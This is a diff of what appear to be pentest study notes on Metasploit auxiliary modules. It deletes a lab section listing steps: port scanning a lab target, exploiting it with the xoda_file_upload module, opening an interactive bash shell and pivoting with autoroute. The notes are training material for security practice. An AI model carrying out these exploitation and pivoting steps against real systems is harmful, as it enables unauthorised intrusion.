@@ -57,24 +57,6 @@ Waarom auxiliary modules gebruiken als je ook met nmap kunt scannen? Auxiliary m
 	- back 
 	- search udp_sweep 
 
-	---- lab ---   
-Commands
-- ip addr  -  me: 192.70.225.2 and target: 192.70.225.3 
-- sudo service postgresql start  && msfconsole -q
-- workspace -a Port_scan_target
-- search tcp portscan 
-- run aux/scanner/portscan/tcp on target
-- use exploit(unix/webapp/xoda_file_upload 
-- sets targeturi / 
-- sysinfo 
-- shell
-- /bin/bash -i 
-- ifconfig
-- exit 
-- Add the route to metasploit's routing table, command: run autoroute -s 192.135.243.2 
-- background
-- search portscan 
-
 
 ### FTP Enumeration
 
